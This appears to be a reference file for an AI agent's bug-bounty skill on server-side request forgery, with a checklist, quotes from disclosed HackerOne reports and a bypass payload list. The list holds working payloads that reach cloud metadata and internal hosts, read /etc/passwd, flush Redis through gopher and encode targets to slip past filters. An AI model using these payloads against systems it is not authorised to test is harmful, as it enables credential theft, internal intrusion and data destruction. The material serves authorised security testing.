# SSRF — Combined Field Guide — Technique reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete technique.

---

## Quick wins



Start here. These are the highest-yield tests for this class.



- Find server-side URL fetchers: webhooks, avatar/image import, link preview, PDF/render, RSS, OAuth metadata, import-from-URL.

- Confirm outbound traffic with a unique DNS/HTTP callback before trying internal targets.

- Test the response body, status code, timing, and error text for internal reachability.

- Check redirect-following: a trusted-domain open redirect can bypass host allowlists.

- Try non-HTTP schemes and protocols used by the backend (gopher, file, dict, ftp).



## Bypass tricks



- Decimal/octal/hex IPs, IPv6-mapped addresses, and DNS names resolving to 127.0.0.1.

- DNS rebinding: resolve a controlled hostname to a public IP, then to 169.254.169.254.

- URL parser confusion with @, #, ?, backslashes, %09/%0d%0a, and userinfo.

- Allowlist suffix tricks: trusted.com.evil.com, evil.com#trusted.com, evil.com?trusted.com.

- Use open redirects on allowlisted hosts to reach internal targets.



## Deeper checklist



- Find URL inputs: webhooks, avatars, imports, previews, PDF/render, RSS, OAuth metadata.

- Use a callback domain first to confirm outbound requests (DNS + HTTP).

- Test internal targets: 127.0.0.1, localhost, [::1], 169.254.169.254, RFC1918, internal hostnames.

- Bypass filters with decimal/octal/hex IPs, DNS rebinding, redirects, userinfo, and URL parsing quirks.

- Try non-HTTP schemes: gopher, file, dict, ftp, and cloud metadata endpoints.

- Check redirect-following and allowlist bypass via open redirects on trusted domains.

- Escalate to credential theft, internal API access, or port scanning with evidence.



## Techniques from real reports



One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.



- **SSRF in Exchange leads to ROOT access in all instances** — `#341876` · Shopify · $0 · ▲587

  > However, I found really easy way to "bypass" it while reading the documentation: the `/v1beta1` endpoint is still available, does not require the `Metadata-Flavor: Google` header and still returns the same token.

- **Server-Side Request Forgery using Javascript allows to exfill data from Google Metadata** — `#530974` · Snapchat · $0 · ▲421

  > - Now hit `/api/v1/media/import` on `ads.snapchat.com`, with the URL parameter http://demon.███████/ssrf.html (or wherever you run it)

- **SSRF on project import via the remote_attachment_url on a Note** — `#826361` · GitLab · $10,000 · ▲359

  > A POST request is not possible here, but as `remote attachment request header=` is also available (https://github.com/carrierwaveuploader/carrierwave/blob/v1.3.1/lib/carrierwave/mount.rb L169) and not blacklisted, the payload could be set via a header.

- **Server Side Request Forgery mitigation bypass** — `#632101` · GitLab · $0 · ▲350

  > After the hook has executed, you should see content of `http://169.254.169.254` returned.

- **Blind SSRF to internal services in matrix preview_link API** — `#1960765` · Reddit · $6,000 · ▲344

  > Visit the https://matrix.redditspace.com/ matrix/media/r0/preview url/?url=

- **TURN server allows TCP and UDP proxying to internal network, localhost and meta-data services** — `#333419` · Slack · $3,500 · ▲323

  > UDP packets may be proxied by setting the `XOR-PEER-ADDRESS` to a private IP in the TURN send message indication (method `0x0006`, <https://tools.ietf.org/html/rfc5766 section-10 ).

- **SSRF  leaking internal google cloud data through upload function [SSH Keys, etc..]** — `#549882` · Vimeo · $0 · ▲276

  > For more information you can read my writeup: https://medium.com/@dPhoeniixx/vimeo-upload-function-ssrf-7466d8630437

- **Full read SSRF in www.evernote.com that can leak aws metadata and local file inclusion** — `#1189367` · Evernote · $0 · ▲264

  > The payload is base64 encoded of : `file:///home/abenavides/ .js`

- **SSRF in graphQL query (pwapi.ex2b.com)** — `#1864188` · EXNESS · $3,000 · ▲261

  > The query for `allTicks` allows setting the parameter `source` that is used to do `GET` requests, this can be set arbitrarily .

- **Unauthenticated blind SSRF in OAuth Jira authorization controller** — `#398799` · GitLab · $4,000 · ▲238

  > - send a `POST` request to the `/-/jira/login/oauth/callback` endpoint, as shown below.

- **Full Read SSRF on Gitlab's Internal Grafana** — `#878779` · GitLab · $0 · ▲229

  > On `secure.gravatar.com`, if you supply the `d` parameter, it allows for redirection to `i0.wp.com` where some of the images are hosted.

- **SSRF in webhooks leads to AWS private keys disclosure** — `#508459` · Omise · $0 · ▲214

  > As a result, it is possible to request a number of things, including AWS credentials on the metadata server located at `http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role`

- **Stored XSS & SSRF in Lark Docs** — `#892049` · Lark Technologies · $3,000 · ▲178

  > A stored XSS (cross site scripting) vulnerability was discovered in Lark Docs that could be escalated into a Server Side Request Forgery (SSRF) vulnerability if opened in a headless browser on the Lark server.

- **SSRF on duckduckgo.com/iu/** — `#398641` · DuckDuckGo · $0 · ▲165

  > `https://duckduckgo.com/iu/?u=http://127.0.0.1:6868%2fstatus%2f?q=http://yimg.com/` returns the following:

- **Server Side Request Forgery** — `#644238` · Lark Technologies · $0 · ▲164

  > https://jinone.github.io/bugbounty-a-simple-ssrf/

- **External SSRF and Local File Read via video upload due to vulnerable FFmpeg HLS processing** — `#1062888` · TikTok · $2,727 · ▲162

  > Make sure that your `header.m3u8` doesn't have anything after `3f` byte(`?` sign).

- **SSRF in Autodesk Rendering leading to account takeover** — `#3024673` · Autodesk · $0 · ▲161

  > A server side request forgery (SSRF) vulnerability was found in Autodesk Rendering, which could have allowed an attacker to send a malicious link to a victim and gain control of their account while logged in.

- **SSRF chained to hit internal host leading to another SSRF which allows to read internal images.** — `#826097` · PlayStation · $1,000 · ▲148

  > Using SSRF to open this URL: https://image.api.np.km.playstation.net/images/?format=png&image=https%3a//store.mgmt.playstation.com/store/api/chihiro/00 09 000/container/US/en/999/UP4134-CUSA00329 00-ONNTGAME00000001/1429722215000/image%3f version%3d00 09…

- **DNS Rebinding SSRF in Burp Suite MCP Server Enables Internal Network Access via send_http1_request Tool** — `#3176157` · PortSwigger Web Security · $0 · ▲144

  > Step2: Setup a DNS server for a domain that you controls that answers the first DNS request on this domain with the IP of a server he controls (in this example 192.168.80.154), and all other DNS requests with 127.0.0.1.

- **Blind SSRF on errors.hackerone.net due to Sentry misconfiguration** — `#374737` · HackerOne · $3,500 · ▲143

  > So I tried to simulate error report with malformed "filename" parameter and got callback on my website from 54.186.141.19 IP.

- **SSRF in https://couriers.indrive.com/api/file-storage** — `#2300358` · inDrive · $0 · ▲141

  > If you request any website like for example ` www.google.com `, ` https://couriers.indrive.com/api/file-storage?url=https://www.google.com `you will see its html content being displayed in the response

- **Server Side Request Forgery (SSRF) in webhook functionality** — `#2301565` · HackerOne · $2,500 · ▲140

  > It occurs when an attacker tricks a server into making requests on their behalf.

- **SSRF on music.line.me through getXML.php** — `#746024` · LY Corporation · $4,500 · ▲135

  > The reporter found an endpoint through which limited SSRF could be achieved.

- **SSRF In Get Video Contents** — `#643622` · Semrush · $0 · ▲125

  > I use URL: `https://1:@127.0.0.1:\@@@@w.youtube.com/@https://www.youtube.com/`, and the response is `{"status":404,"error":"Invalid url 'https:\/\/1:@127.0.0.1:\\@@@@w.youtube.com\/@https:\/www.youtube.com\/' (Status code 404)"}`.(PIC3)

- **Full read SSRF via Lark Docs `import as docs` feature** — `#1409727` · Lark Technologies · $5,000 · ▲124

  > A SSRF (server side request forgery) vulnerability was found in the LarkDocs using the "import as docs" feature, which could have potentially been used to access services running on the internal network.

- **Blind SSRF on https://my.exnessaffiliates.com/ allows for internal network enumeration** — `#1832494` · EXNESS · $0 · ▲120

  > `https://my.exnessaffiliates.com/api/partner integrations/template/probe`

- **Server-Side Request Forgery (SSRF) via Game Export API** — `#3165242` · Lichess · $0 · ▲116

  > Make a request to: `/game/export/[GAME ID]?players=http://169.254.169.254/latest/meta-data/ `

- **SSRF on image renderer** — `#811136` · PlayStation · $1,000 · ▲103

  > image.api.np.km.playstation.net allows image urls to be passed via the `image` parameter

- **Header modification results in disclosure of Slack infra metadata to unauthorized parties** — `#727330` · Slack · $0 · ▲97

  > So, with the blind SSRF vulnerability, the attackers can send arbitrary requests to the intranet, ex: port scanning by identifying the response delay time, to know 169.265.169.254:443 is closed, 169.265.169.254:80 is opened...and so on.

- **[my.stripo.email] Blind SSRF Vulnerability in Stripo App Export via Missing Endpoints Export Email Message to Zapier** — `#2932960` · Stripo Inc · $0 · ▲92

  > The vulnerability exists in the endpoint `/exportservice/v3/exports/WEBHOOK/accounts`.



## Case studies



### SSRF in Exchange leads to ROOT access in all instances

`#341876` · Shopify · $0 · medium · 2018-05-23 · ▲587

> The Exploit Chain - How to get root access on all Shopify instances 1 - Access Google Cloud Metadata - 1: Create a store (partners.shopify.com) - 2: Edit the template password.liquid and add the following content: - 3: Go to https://exchange.shopify.com/create-a-listing and install the Exchange app - 4: Wait for the store screenshot to appear on the Create Listing page - 5: Download the PNG and open it using image editing software or convert it to JPEG…



### Server Side Request Forgery (SSRF) via Analytics Reports

`#2262382` · HackerOne · $25,000 · critical · 2023-12-08 · ▲529

> Hello Gents, I would like to report an issue where attackers are able to read internal files via an SSRF vulnerability. Proof of concept + ███ Impact SSRF. Thanks and have a nice day!



### Server-Side Request Forgery using Javascript allows to exfill data from Google Metadata

`#530974` · Snapchat · $0 · n/a · 2020-11-30 · ▲421

> Hey there, I was looking at your ads site with @daeken, we found some weird behavior in the import function of the creative app. Here are the steps: POC - Login to https://business.snapchat.com/ - Go to creative library - New Creative - Under "Topsnap Media", click on "Create" - Click on any of the templates and load it - Click on one of the images in the template - Replace - Import - This is where the SSRF exists .



### SSRF on project import via the remote_attachment_url on a Note

`#826361` · GitLab · $10,000 · high · 2020-06-07 · ▲359

> The Note model has an attachment which is provided by a CarrierWave uploader: One of the features this provides is the ability to download and attach a file via a url, see https://github.com/carrierwaveuploader/carrierwave/blob/v1.3.1/lib/carrierwave/mount.rb L80. This means that the Note model has a method remote attachment url= which can be used to perform this action.



### Server Side Request Forgery mitigation bypass

`#632101` · GitLab · $0 · high · 2020-04-18 · ▲350

> This vulnerability allows attacker to send arbitrary requests to local network which hosts GitLab and read the response. This is possible due to flawed DNS rebinding protection. The attack is possible due to flaw here: https://gitlab.com/gitlab-org/gitlab-ce/blob/108c3cf16bed5733ffae086fb62c226961356560/lib/gitlab/url blocker.rb L59 The validate function performs DNS lookup to check whether the IP address of a domain belongs to the local network.



## Query the corpus



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class ssrf --limit 20

python3 ~/.local/share/hackerone-reports/h1.py stats --class ssrf

python3 ~/.local/share/hackerone-reports/h1.py show <id> --full

```



Search by technology, endpoint, parameter, or program. Examples:



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class ssrf

python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class ssrf --min-bounty 1000

```



## Bypass Techniques



### Blocklist Bypasses (When `localhost`, `127.0.0.1`, `169.254.x.x` are blocked)



```

# IPv6 equivalents

http://[::1]/

http://[::ffff:127.0.0.1]/

http://[::ffff:169.254.169.254]/



# Decimal/octal/hex encoding of IP

http://2130706433/          (127.0.0.1 decimal)

http://0x7f000001/          (127.0.0.1 hex)

http://0177.0.0.1/          (octal)

http://127.1/               (short form)

http://0/                   (resolves to 0.0.0.0)



# DNS rebinding - register a domain that resolves to internal IP after first check

# Use https://lock.cmpxchg8b.com/rebinder.html



# Subdomain pointing to internal IP

http://localtest.me/         (resolves to 127.0.0.1)

http://127.0.0.1.nip.io/

http://customer.attacker.com/ (A record → 192.168.1.1)



# URL parser confusion

http://evil.com@127.0.0.1/

http://127.0.0.1#evil.com

http://127.0.0.1%25@evil.com  (URL encoding)

http://evil.com\.127.0.0.1/   (backslash)



# Protocol confusion

file:///etc/passwd

dict://127.0.0.1:6379/

gopher://127.0.0.1:6379/_FLUSHALL  (Redis via gopher)

sftp://attacker.com:11111/

ldap://127.0.0.1/



# Redirect chain bypass

https://allowlisted-domain.com → HTTP 301 → http://169.254.169.254/



# Case variation / URL encoding

http://Localhost/

http://127.0.0.1%2F@evil.com/

```



### App-layer input-encoding bypass (filter sees one thing, fetcher another)

When the endpoint takes the target URL **wrapped/encoded** — a base64 blob in the path, a

double-encoded param, a JSON-nested value — the front-end WAF/allowlist inspects the *raw*

input while the backend **decodes it before fetching**. Encode the internal target so the

filter never sees `169.254` / `localhost` in clear:

```

# target URL base64'd into a path segment the app decodes, then fetches

GET /proxy/aHR0cDovLzE2OS4yNTQuMTY5LjI1NC8=/x.js   # = http://169.254.169.254/  (disclosed: reports/1189367)

# double-URL-encode the host so one decode pass survives the filter

url=http%253A%252F%252F169.254.169.254%252F

```

Always test whether the parameter is decoded once, twice, or base64'd before the fetch — the number of decode passes is the bug.



### Path-normalization / semicolon bypass (front-end filter vs origin path)

A front-end that blocks `url=` to internal hosts can be skipped when the origin re-normalizes

path segments the edge left intact — inject `;/`, `/../`, or matrix-param segments so the edge

routes it as benign but the origin resolves the SSRF fetch:

```

GET /;/;/resource/md/get/url?url=http://oast.example/   # edge ignores, origin fetches (disclosed: reports/2035332)

```

Full-read SSRF via this path-confusion reaches cloud-credential endpoints the direct `url=` param blocked.



### Schema/Protocol Bypasses

```

# When only http/https allowed but implementation is loose

http://169.254.169.254:80@evil.com/

//169.254.169.254/

```



### TOCTOU (Time-of-Check vs Time-of-Use)

- Validate URL → sleep → redirect to internal (race condition with DNS rebinding)

- Register a domain with 0-TTL, rotate DNS between validation and fetch calls



### When Response is Not Returned (Blind SSRF)

- Use DNS-only callbacks (data encoded in subdomain labels)

- Use timing differences for port scanning

- Use different HTTP methods (PUT/DELETE) to trigger distinct behaviors on internal services

- Chain with other bugs that leak response data (e.g., error messages, logs)



---
